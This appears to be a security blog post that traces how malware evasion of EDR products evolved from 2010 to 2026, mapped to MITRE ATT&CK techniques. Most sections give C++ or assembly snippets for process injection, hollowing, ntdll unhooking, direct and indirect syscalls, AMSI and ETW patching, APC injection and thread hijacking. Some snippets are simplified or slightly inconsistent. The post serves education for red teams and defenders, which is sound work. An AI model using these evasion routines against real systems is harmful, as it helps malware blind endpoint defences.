---
layout: attack
title: "The EDR Bypass Roadmap: Technical Evolution and API Subversion"
---

<img height="150" align="left" src="/images/edr-bypass-timeline.png"> The battle for the endpoint is won or lost in telemetry. This has been increasingly recognized by the security community, with projects such as [EDR Telemetry](https://www.edr-telemetry.com/) aiming to systematically compare and improve EDR visibility.  

This timeline breaks down the evolution of evasion—from early Windows API abuse to modern hardware- and behavior-level subversion—mapped against the **MITRE ATT&CK®** framework and aligned with my research into [**Windows APIs**](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [**ETW (Event Tracing for Windows)**](https://benjitrapp.github.io/defenses/2024-02-11-etw/).

- [Phase 1: The Foundation (2010–2015)](#phase-1-the-foundation-20102015)
  - [2012–2013: Injection Primitives \& API Abuse](#20122013-injection-primitives--api-abuse)
  - [2014: Reflective \& Manual Loading](#2014-reflective--manual-loading)
- [Phase 2: The Hooking Crusade (2015–2017)](#phase-2-the-hooking-crusade-20152017)
  - [2015–2016: Understanding API Hooking](#20152016-understanding-api-hooking)
  - [2016: Manual Unhooking Emerges](#2016-manual-unhooking-emerges)
- [Phase 3: The Syscall Revolution (2017–2019)](#phase-3-the-syscall-revolution-20172019)
  - [2017: Direct Syscalls](#2017-direct-syscalls)
  - [2018–2019: Syscall Evolution](#20182019-syscall-evolution)
- [Phase 4: The age of Deception - Syscalls \& Stack Integrity (2019–2021)](#phase-4-the-age-of-deception---syscalls--stack-integrity-20192021)
- [Phase 5: The ETW \& Memory Evasion Era (2020–2022)](#phase-5-the-etw--memory-evasion-era-20202022)
- [Phase 6: Advanced Injection \& Modern Era (2022–Present / Time of Writing: 2026)](#phase-6-advanced-injection--modern-era-2022present--time-of-writing-2026)
- [Technical Summary \& API Matrix](#technical-summary--api-matrix)
- [Conclusion](#conclusion)

Overview about the timeline, it phases and related techniques that will be discussed below:

![](/images/edr_bypass_timeline_chart.png)

## Phase 1: The Foundation (2010–2015)
**Strategy:** Exploiting trust by utilizing legitimate Windows mechanisms for code placement.

### 2012–2013: Injection Primitives & API Abuse

Early EDR solutions primarily monitored **high-level Windows APIs** with limited context or correlation. This made classic injection primitives highly effective, particularly when combined with trusted parent processes.

Common techniques included:

- **Classic DLL Injection ([T1055.001](https://attack.mitre.org/techniques/T1055/001/))**
  - `OpenProcess`
  - `VirtualAllocEx`
  - `WriteProcessMemory`
  - `CreateRemoteThread`

```cpp
// Example: Classic DLL Injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID);
LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwSize, 
                                    MEM_COMMIT, PAGE_READWRITE);

WriteProcessMemory(hProcess, pRemoteBuf, 
                   "C:\\payload.dll", dwSize, NULL);

HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"),
    pRemoteBuf, 0, NULL);
```

These APIs are discussed in detail in my [Windows API offensive overview](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/), where their abuse patterns and detection blind spots are broken down.

- **Process Hollowing (RunPE)**
- **Manual DLL Mapping ([T1055.001](https://attack.mitre.org/techniques/T1055/001/))**
  - Avoiding Import Address Table (IAT) hooks
  - Bypassing loader-based telemetry

```cpp
// Example: Manual Mapping - Resolving Imports
void ResolveImports(PBYTE pBase, PIMAGE_IMPORT_DESCRIPTOR pIID) {
    while (pIID->Name) {
        PIMAGE_THUNK_DATA pThunk = 
            (PIMAGE_THUNK_DATA)(pBase + pIID->FirstThunk);
        
        while (pThunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME pIBN = 
                (PIMAGE_IMPORT_BY_NAME)(pBase + pThunk->u1.AddressOfData);
            
            HMODULE hMod = LoadLibraryA((LPCSTR)(pBase + pIID->Name));
            FARPROC pFunc = GetProcAddress(hMod, pIBN->Name);
            
            pThunk->u1.Function = (ULONGLONG)pFunc;
            pThunk++;
        }
        pIID++;
    }
}
```

These techniques worked because EDRs lacked:
- Memory-write ↔ thread-creation correlation
- Call stack awareness
- Kernel-level process visibility

- **Process Hollowing ([T1055.012](https://attack.mitre.org/techniques/T1055/012/))**  
  Hijacking a legitimate process by unmapping its code and replacing it with a malicious payload.

```cpp
// Example: Creating a suspended process for hollowing
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;

CreateProcessA(
    "C:\Windows\System32\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL,
    &si, &pi
);

// Unmapping the original image (Native API)
typedef NTSTATUS (NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);

_NtUnmapViewOfSection NtUnmapViewOfSection =
    (_NtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtUnmapViewOfSection"
    );

NtUnmapViewOfSection(pi.hProcess, pBaseAddress);
```

### 2014: Reflective & Manual Loading

Stephen Fewer's **Reflective DLL Loading ([T1055.001](https://attack.mitre.org/techniques/T1055/001/))** introduced a new paradigm: executing DLLs without invoking the Windows loader. By avoiding `LoadLibrary`, attackers could bypass many API hooks and loader callbacks.

```cpp
// Example: Reflective DLL Loader stub
HMODULE WINAPI ReflectiveLoader(VOID) {
    ULONG_PTR uiLibraryAddress;
    USHORT usCounter;
    
    // Get own image base
    uiLibraryAddress = caller();
    uiLibraryAddress = (ULONG_PTR)((UINT_PTR)uiLibraryAddress & 0xFFFFFFFFFFFF0000);
    
    while (TRUE) {
        if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE) {
            break;
        }
        uiLibraryAddress -= 0x10000;
    }
    
    // Parse PE headers and perform manual loading
    // ... (relocations, imports, TLS, etc.)
    
    return (HMODULE)uiLibraryAddress;
}
```

While still heavily used in modern C2 frameworks, reflective loading has increasingly shifted toward:
- Position Independent Code (PIC)
- Shellcode-only loaders

This evolution mirrors the detection trends discussed in the Windows API series above.

## Phase 2: The Hooking Crusade (2015–2017)
**Strategy:** Detecting and removing userland sensors.

### 2015–2016: Understanding API Hooking

As EDR products matured, they aggressively adopted **userland API hooking** for visibility into attacker tradecraft:

- Inline hooks (prologue patching)
- IAT hooking
- Trampoline-based redirection

Targeted APIs included:
- `NtCreateProcess`
- `NtAllocateVirtualMemory`
- `NtWriteVirtualMemory`
- `NtCreateFile`

These APIs and their monitoring implications are covered in depth in the [Windows API attack surface analysis](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/).

### 2016: Manual Unhooking Emerges

Attackers responded by restoring trust boundaries inside userland:

- **Detecting hooks ([T1562.001](https://attack.mitre.org/techniques/T1562/001/))** by comparing in-memory vs. on-disk bytes
- Loading clean DLL copies
- Restoring original syscall stubs

```cpp
// Example: Detecting IAT hooks
BOOL DetectIATHook(HMODULE hModule, LPCSTR szFunc) {
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + pDosHdr->e_lfanew);
    
    PIMAGE_IMPORT_DESCRIPTOR pImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(
        (BYTE*)hModule + 
        pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    
    // Compare IAT entries with expected addresses
    FARPROC pExpected = GetProcAddress(hModule, szFunc);
    FARPROC pActual = *(FARPROC*)((BYTE*)hModule + pImpDesc->FirstThunk);
    
    return (pExpected != pActual);
}
```

- **Manual Unhooking ([T1562.001](https://attack.mitre.org/techniques/T1562/001/))**  
  Overwriting hooked `.text` sections with clean bytes.

```cpp
// Example: Overwriting ntdll hooks with a clean buffer
DWORD oldProtect;

VirtualProtect(pNtOpenProcess, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pNtOpenProcess, "\x4c\x8b\xd1\xb8\x26", 5); // Original bytes
VirtualProtect(pNtOpenProcess, 5, oldProtect, &oldProtect);
```

## Phase 3: The Syscall Revolution (2017–2019)
**Strategy:** Bypassing the hooked middleman (`ntdll.dll`) entirely.

### 2017: Direct Syscalls

Direct syscalls removed EDR visibility by transitioning directly to kernel mode, bypassing all userland hooks.

- **Direct Syscalls ([T1106](https://attack.mitre.org/techniques/T1106/))**

```C
; Example: Syscall stub for NtAllocateVirtualMemory (x64)
public NtAllocateVirtualMemory

NtAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h    ; Syscall number for Win10 (example)
    syscall
    ret
NtAllocateVirtualMemory endp
```

### 2018–2019: Syscall Evolution

Research such as **Hell’s Gate**, **Halos Gate**, and **Tartarus’ Gate** addressed syscall volatility and hooked exports, culminating in tools like **SysWhispers**.
```cpp
// Example: Hell's Gate - Dynamically resolve syscall numbers
DWORD GetSSN(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    
    // Check if function is hooked
    if (*(BYTE*)pFunc == 0xE9) { // JMP instruction
        // Use Halos Gate technique - search nearby functions
        for (int i = 1; i <= 32; i++) {
            BYTE* pNeighbor = (BYTE*)pFunc + (i * 0x20);
            if (*(DWORD*)pNeighbor == 0xB8D18B4C) { // mov r10, rcx; mov eax
                return *(DWORD*)(pNeighbor + 4) + i;
            }
        }
    }
    
    // Extract SSN from function prologue
    if (*(DWORD*)pFunc == 0xB8D18B4C) { // mov r10, rcx; mov eax, SSN
        return *(DWORD*)((BYTE*)pFunc + 4);
    }
    
    return 0;
}
```
## Phase 4: The age of Deception - Syscalls & Stack Integrity (2019–2021)
**Strategy:** Preserving legitimate execution context.

As EDRs began analyzing call stacks, indirect syscalls ensured execution appeared to originate from trusted modules.

- **ROP/JOP syscall gadgets ([T1055](https://attack.mitre.org/techniques/T1055/))**
- **Stack pivoting ([T1055.011](https://attack.mitre.org/techniques/T1055/011/))**
- **Return address spoofing ([T1562.001](https://attack.mitre.org/techniques/T1562/001/))**

```cpp
// Example: Indirect Syscall using ROP gadget
void IndirectSyscall() {
    // Find 'syscall; ret' gadget in ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE pBase = (PBYTE)hNtdll;
    PBYTE pSyscallGadget = NULL;
    
    // Search for syscall instruction (0x0F 0x05)
    for (SIZE_T i = 0; i < 0x100000; i++) {
        if (pBase[i] == 0x0F && pBase[i+1] == 0x05) {
            pSyscallGadget = &pBase[i];
            break;
        }
    }
    
    // Call syscall through gadget (preserves legitimate call stack)
    typedef NTSTATUS(*SyscallFn)();
    SyscallFn syscall = (SyscallFn)pSyscallGadget;
    
    __asm {
        mov r10, rcx
        mov eax, SSN  // Syscall Service Number
        jmp pSyscallGadget  // Jump to syscall gadget in ntdll
    }
}
```

These techniques laid the groundwork for modern call stack spoofing and sleep obfuscation.

## Phase 5: The ETW & Memory Evasion Era (2020–2022)
**Strategy:** Blinding telemetry pipelines.

As defenders shifted toward [**ETW**](https://benjitrapp.github.io/defenses/2024-02-11-etw/), attackers responded with:

- **Provider patching ([T1562.006](https://attack.mitre.org/techniques/T1562/006/))**
- **Session hijacking ([T1562.006](https://attack.mitre.org/techniques/T1562/006/))**
- **Trace tampering ([T1562.006](https://attack.mitre.org/techniques/T1562/006/))**

```cpp
// Example: ETW Provider Removal
void DisableAMSIETW() {
    // Disable AMSI ETW Provider
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 32, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch to always return AMSI_RESULT_CLEAN
    memset(pAmsiScanBuffer, 0x90, 6);  // NOP sled
    *(BYTE*)pAmsiScanBuffer = 0xB8;      // mov eax,
    *(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 0; // AMSI_RESULT_CLEAN
    *(BYTE*)((BYTE*)pAmsiScanBuffer + 5) = 0xC3; // ret
    
    VirtualProtect(pAmsiScanBuffer, 32, oldProtect, &oldProtect);
}
```

- **ETW Patching ([T1562.006](https://attack.mitre.org/techniques/T1562/006/))**

```cpp
// Example: Silencing ETW telemetry
void PatchETW() {
    void* pEventWrite =
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

    DWORD old;
    VirtualProtect(pEventWrite, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)pEventWrite = 0xC3; // RET
    VirtualProtect(pEventWrite, 1, old, &old);
}
```

---

## Phase 6: Advanced Injection & Modern Era (2022–Present / Time of Writing: 2026)
**Strategy:** Subverting execution and detection logic.

- **Early Bird Injection ([T1055](https://attack.mitre.org/techniques/T1055/))**  
  Leveraging APC (Asynchronous Procedure Call) queues to inject code before the main thread executes, exploiting the process initialization window.

```cpp
// Example: Early Bird APC Injection
void EarlyBirdInjection(LPCSTR szTargetPath, PVOID pShellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create target process in suspended state
    CreateProcessA(szTargetPath, NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Allocate memory in target process
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write shellcode to allocated memory
    WriteProcessMemory(pi.hProcess, pRemoteCode, pShellcode, shellcodeSize, NULL);
    
    // Queue APC to main thread (executes before thread starts)
    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
    
    // Resume thread - APC executes before EntryPoint
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

This technique is particularly effective because:
- APC execution occurs before EDR hooks are fully initialized
- The process is legitimate at creation time
- No remote thread creation is required

- **Early Cascade Injection ([T1055](https://attack.mitre.org/techniques/T1055/))**  
  An evolution of Early Bird that chains multiple APC calls to establish persistence and evade behavioral detection.

```cpp
// Example: Early Cascade - Chained APC Injection
void EarlyCascadeInjection(LPCSTR szTargetPath, PVOID pStage1, PVOID pStage2) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    CreateProcessA(szTargetPath, NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Stage 1: Unhook or disable EDR
    LPVOID pStage1Addr = VirtualAllocEx(pi.hProcess, NULL, 0x1000,
                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pStage1Addr, pStage1, 0x1000, NULL);
    
    // Stage 2: Final payload
    LPVOID pStage2Addr = VirtualAllocEx(pi.hProcess, NULL, 0x2000,
                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pStage2Addr, pStage2, 0x2000, NULL);
    
    // Queue cascaded APCs
    QueueUserAPC((PAPCFUNC)pStage1Addr, pi.hThread, (ULONG_PTR)pStage2Addr);
    QueueUserAPC((PAPCFUNC)pStage2Addr, pi.hThread, NULL);
    
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

- **Thread Execution Hijacking ([T1055.003](https://attack.mitre.org/techniques/T1055/003/))**
  Suspending threads and modifying their context to execute malicious code.

```cpp
// Example: Thread Hijacking
void HijackThread(DWORD dwTargetPID) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwTargetPID) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                SuspendThread(hThread);
                
                CONTEXT ctx = { 0 };
                ctx.ContextFlags = CONTEXT_FULL;
                GetThreadContext(hThread, &ctx);
                
                // Redirect RIP to shellcode
                ctx.Rip = (DWORD64)pShellcode;
                SetThreadContext(hThread, &ctx);
                ResumeThread(hThread);
                break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
}
```

- **Vectored Exception Handling (VEH) ([T1562.001](https://attack.mitre.org/techniques/T1562/001/))**  
  Leveraging exception-driven control flow to execute syscalls stealthily.

```cpp
LONG WINAPI MyHandler(PEXCEPTION_POINTERS pExcpt) {
    if (pExcpt->ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT) {
        pExcpt->ContextRecord->Rip++; // Skip breakpoint
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

AddVectoredExceptionHandler(1, MyHandler);
```

## Technical Summary & API Matrix

| Phase | Technique | API Cross-Reference | MITRE TID |
|------|----------|--------------------|-----------|
| **Foundation** | Classic DLL Injection | `CreateRemoteThread`, `WriteProcessMemory` | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| **Foundation** | Process Hollowing | `NtUnmapViewOfSection`, `CreateProcessA` | [T1055.012](https://attack.mitre.org/techniques/T1055/012/) |
| **Foundation** | Manual DLL Mapping | `VirtualAllocEx`, Manual Import Resolution | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| **Foundation** | Reflective DLL Loading | Self-contained loader, PIC | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| **Hooking** | IAT Hook Detection | Import Directory parsing | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Hooking** | DLL Unhooking | `VirtualProtect`, Memory restoration | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Syscalls** | Direct Syscalls | Inline assembly, syscall instruction | [T1106](https://attack.mitre.org/techniques/T1106/) |
| **Syscalls** | Hell's Gate / Halos Gate | Dynamic SSN resolution | [T1106](https://attack.mitre.org/techniques/T1106/) |
| **Syscalls** | Indirect Syscalls | ROP gadgets, `syscall; ret` | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Syscalls** | Stack Spoofing | Return address manipulation | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Tracing** | ETW Patching | `EtwEventWrite` patching | [T1562.006](https://attack.mitre.org/techniques/T1562/006/) |
| **Tracing** | AMSI Bypass | `AmsiScanBuffer` patching | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Modern** | Early Bird Injection | `QueueUserAPC`, `CreateProcess` (suspended) | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Modern** | Early Cascade Injection | Chained APC calls, multi-stage execution | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Modern** | Thread Hijacking | `SetThreadContext`, `SuspendThread` | [T1055.003](https://attack.mitre.org/techniques/T1055/003/) |
| **Modern** | VEH Execution | `AddVectoredExceptionHandler` | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Modern** | Module Stomping | Memory overwrite in loaded modules | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) |
| **Modern** | Sleep Obfuscation | Memory encryption during sleep | [T1055](https://attack.mitre.org/techniques/T1055/) |


## Conclusion
EDR bypass research has consistently demonstrated one truth: **visibility gaps define opportunity**. As detection shifts from APIs to behavior, and from userland to kernel and hardware, attackers adapt by abusing trust, context, and execution semantics.

This timeline illustrates a clear pattern: each defensive innovation creates new constraints that offensive research systematically defeats. From Stephen Fewer's [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) ([T1055.001](https://attack.mitre.org/techniques/T1055/001/)) to Jackson_T's [SysWhispers](https://github.com/jthuraisamy/SysWhispers) ([T1106](https://attack.mitre.org/techniques/T1106/)), the community has consistently pushed the boundaries of what's detectable.

Modern techniques like [Ekko](https://github.com/Cracked5pider/Ekko) sleep obfuscation, [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) ([T1562.001](https://attack.mitre.org/techniques/T1562/001/)), and [module stomping](https://offensivedefence.co.uk/posts/module-stomping/) ([T1055.013](https://attack.mitre.org/techniques/T1055/013/)) represent the convergence of these techniques—combining memory manipulation, execution context spoofing, and ETW evasion into cohesive chains.

As detailed in my research on [Windows APIs](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [ETW internals](https://benjitrapp.github.io/defenses/2024-02-11-etw/), the battlefield has moved beyond simple API hooking. Projects like [EDR Telemetry](https://www.edr-telemetry.com/) are pushing vendors toward kernel-level instrumentation and behavioral analytics, while offensive research continues to explore [direct system calls](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/), [hardware-based evasion](https://connormcgarr.github.io/hvci/), and [VBS/HVCI bypasses](https://blog.xpnsec.com/windows-warbird-privesc/).

Understanding this evolution—grounded in Windows internals and telemetry design—is essential for both red teams and defenders navigating the modern endpoint arms race. The [MITRE ATT&CK framework](https://attack.mitre.org/) provides structure, but the techniques themselves evolve faster than taxonomies can capture them.
